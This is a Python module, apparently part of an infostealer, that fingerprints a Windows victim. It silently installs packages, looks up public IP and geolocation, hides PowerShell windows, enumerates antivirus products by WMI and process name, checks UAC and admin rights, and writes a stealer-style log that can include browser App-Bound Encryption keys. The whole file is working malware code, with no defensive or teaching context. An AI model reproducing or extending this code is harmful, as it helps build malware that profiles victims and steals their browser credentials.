# modules/userinformation.py - Comprehensive system information gathering

import os
import sys
import subprocess
import platform
import ctypes
import json
from datetime import datetime
import urllib.request

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("wmi", "wmi"),
    ("psutil", "psutil")
])

import wmi
import psutil
from config import log

BANNER = r"""  _____            _ _ _         
 |  __ \          | (_) |        
 | |__) |___  __ _| |_| |_ _   _ 
 |  _  // _ \/ _` | | | __| | | |
 | | \ \  __/ (_| | | | |_| |_| |
 |_|  \_\___|\__,_|_|_|\__|\__, |
                            __/ |
                           |___/ 
"""

def get_public_ip_info():
    """Get public IP and geolocation data"""
    try:
        response = urllib.request.urlopen('http://ip-api.com/json/', timeout=5)
        data = json.loads(response.read().decode())
        return {
            'ip': data.get('query', 'UNKNOWN'),
            'country': data.get('country', 'UNKNOWN'),
            'city': data.get('city', 'UNKNOWN'),
            'zip': data.get('zip', 'UNKNOWN'),
            'timezone': data.get('timezone', 'UNKNOWN')
        }
    except:
        return {
            'ip': 'UNKNOWN',
            'country': 'UNKNOWN',
            'city': 'UNKNOWN',
            'zip': 'UNKNOWN',
            'timezone': 'UNKNOWN'
        }

def get_hwid():
    """Generate HWID"""
    try:
        c = wmi.WMI()
        for item in c.Win32_ComputerSystemProduct():
            return item.UUID.replace("-", "")
    except:
        import uuid
        return uuid.UUID(int=uuid.getnode()).hex.upper()

def get_screen_resolution():
    """Get screen resolution"""
    try:
        user32 = ctypes.windll.user32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        return f"{{Width={width}, Height={height}}}"
    except:
        return "UNKNOWN"

def get_timezone():
    """Get system timezone"""
    try:
        result = subprocess.run(['powershell', '-Command', '[System.TimeZoneInfo]::Local.DisplayName'],
                              capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return result.stdout.strip()
    except:
        return "UNKNOWN"

def get_os_info():
    """Get detailed OS information"""
    try:
        c = wmi.WMI()
        for os in c.Win32_OperatingSystem():
            return f"{os.Caption} {os.OSArchitecture}"
    except:
        return platform.platform()

def get_current_language():
    """Get current system language"""
    try:
        windll = ctypes.windll.kernel32
        lang_id = windll.GetUserDefaultUILanguage()
        
        languages = {
            0x0409: "English (United States)",
            0x0809: "English (United Kingdom)",
            0x0C0A: "Spanish (Spain)",
            0x080A: "Spanish (Mexico)",
            0x340A: "Spanish (Chile)",
            0x040C: "French (France)",
            0x0407: "German (Germany)",
            0x0410: "Italian (Italy)",
            0x0416: "Portuguese (Brazil)",
            0x0419: "Russian",
            0x0411: "Japanese",
            0x0412: "Korean",
            0x0804: "Chinese (Simplified)"
        }
        
        return languages.get(lang_id, f"Language Code: {hex(lang_id)}")
    except:
        return "UNKNOWN"

def get_keyboard_layouts():
    """Get installed keyboard layouts"""
    try:
        result = subprocess.run(
            ['powershell', '-Command', 'Get-WinUserLanguageList | Select-Object -ExpandProperty EnglishName'],
            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        layouts = [line.strip() for line in result.stdout.split('\n') if line.strip()]
        return layouts
    except:
        return ["UNKNOWN"]

def get_hardware_info():
    """Get CPU, GPU, RAM information"""
    hardware = []
    
    try:
        c = wmi.WMI()
        
        # CPU Info
        for cpu in c.Win32_Processor():
            hardware.append(f"Name: {cpu.Name}, {cpu.NumberOfCores} Cores")
        
        # GPU Info
        for gpu in c.Win32_VideoController():
            vram = gpu.AdapterRAM if gpu.AdapterRAM else 0
            hardware.append(f"Name: {gpu.Name}, {vram} bytes")
        
        # RAM Info
        total_ram = psutil.virtual_memory().total
        ram_mb = total_ram / (1024 * 1024)
        hardware.append(f"Name: Total of RAM, {ram_mb:.2f} MB or {total_ram} bytes")
    except:
        hardware.append("Hardware info unavailable")
    
    return hardware

def get_antiviruses():
    """Detect installed antivirus software"""
    avs = []
    
    try:
        c = wmi.WMI(namespace="root\\SecurityCenter2")
        for av in c.AntiVirusProduct():
            avs.append(av.displayName)
    except:
        pass
    
    # Fallback: Check common AV processes
    av_processes = {
        'MsMpEng.exe': 'Windows Defender',
        'avgnt.exe': 'Avira',
        'avp.exe': 'Kaspersky',
        'NortonSecurity.exe': 'Norton',
        'mcshield.exe': 'McAfee',
        'bdagent.exe': 'Bitdefender',
        'avastsvc.exe': 'Avast',
        'AvastUI.exe': 'Avast'
    }
    
    for proc in psutil.process_iter(['name']):
        try:
            proc_name = proc.info['name']
            if proc_name in av_processes and av_processes[proc_name] not in avs:
                avs.append(av_processes[proc_name])
        except:
            continue
    
    return avs if avs else ["None detected"]

def check_uac_status():
    """Check UAC (User Account Control) status"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
                            0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, "EnableLUA")
        winreg.CloseKey(key)
        
        if value == 0:
            return "Disabled"
        else:
            return "Enabled"
    except:
        return "UNKNOWN"

def check_process_elevation():
    """Check if process is running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def grab(abe_keys=None):
    """Main function to gather all system information"""
    log("Gathering system information...")
    
    # Get all data
    ip_info = get_public_ip_info()
    hwid = get_hwid()
    screen_res = get_screen_resolution()
    timezone = get_timezone()
    os_info = get_os_info()
    language = get_current_language()
    keyboards = get_keyboard_layouts()
    hardware = get_hardware_info()
    antiviruses = get_antiviruses()
    uac = check_uac_status()
    elevated = check_process_elevation()
    
    # Build formatted output
    output = BANNER
    output += f"Build ID: {os.path.basename(sys.argv[0])}\n"
    output += f"IP: {ip_info['ip']}\n"
    output += f"FileLocation: {os.path.abspath(sys.argv[0])}\n"
    output += f"UserName: {os.getenv('USERNAME')}\n"
    output += f"Country: {ip_info['country']}\n"
    output += f"Zip Code: {ip_info['zip']}\n"
    output += f"Location: {ip_info['city']}\n"
    output += f"HWID: {hwid}\n"
    output += f"Current Language: {language}\n"
    output += f"ScreenSize: {screen_res}\n"
    output += f"TimeZone: {timezone}\n"
    output += f"Operation System: {os_info}\n"
    output += f"UAC: {uac}\n"
    output += f"Process Elevation: {elevated}\n"
    output += f"Log date: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
    
    output += "Available KeyboardLayouts: \n"
    for kb in keyboards:
        output += f"{kb}\n"
    
    output += "Hardwares: \n"
    for hw in hardware:
        output += f"{hw}\n"
    
    output += "Anti-Viruses: \n"
    for av in antiviruses:
        output += f"{av}\n"
    
    # Add ABE keys if provided
    if abe_keys:
        output += "\nApp-Bound Encryption Keys: \n"
        for key in abe_keys:
            output += f"{key}\n"
    
    log("System information gathered")
    return output